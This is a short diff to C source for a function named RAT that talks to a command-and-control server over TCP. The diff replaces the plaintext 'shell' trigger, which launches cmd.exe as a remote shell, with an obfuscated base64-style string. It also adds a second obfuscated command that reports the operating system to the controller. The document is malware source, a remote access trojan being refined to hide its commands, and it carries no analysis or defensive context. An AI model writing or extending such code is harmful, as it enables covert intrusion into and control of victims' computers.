@@ -136,7 +136,7 @@ void RAT(char* C2_Server, int C2_Port)
                 command = strtok(CommandReceived, delim);
 
                 // Should only be used in individual interactive environments == TBC
-                if ((strcmp(command, "shell") == 0))
+                if ((strcmp(command, "aSB3YW50IHNoZWxsIG5vdw") == 0))
                 {
                     char Process[] = "cmd.exe";
                     STARTUPINFO sinfo;
@@ -161,6 +161,16 @@ void RAT(char* C2_Server, int C2_Port)
                     char buffer[64] = "";
                     strcat(buffer,"[* Agent-Msg] Exiting shell\n");
                     send(tcp_sock,buffer,strlen(buffer) + 1, 0);
+
+                    memset(buffer, 0, sizeof(buffer));
+                    memset(CommandReceived, 0, sizeof(CommandReceived));
+                }
+                else if ((strcmp(command, "UHJvYmluZyBPcGVyYXRpbmcgU3lzdGVt") == 0))
+                {
+                    char buffer[257] = "";
+                    strcat(buffer, "Windows");
+                    //strcat(buffer, "\n");
+                    send(tcp_sock, buffer, strlen(buffer) + 1, 0);
 
                     memset(buffer, 0, sizeof(buffer));
                     memset(CommandReceived, 0, sizeof(CommandReceived));
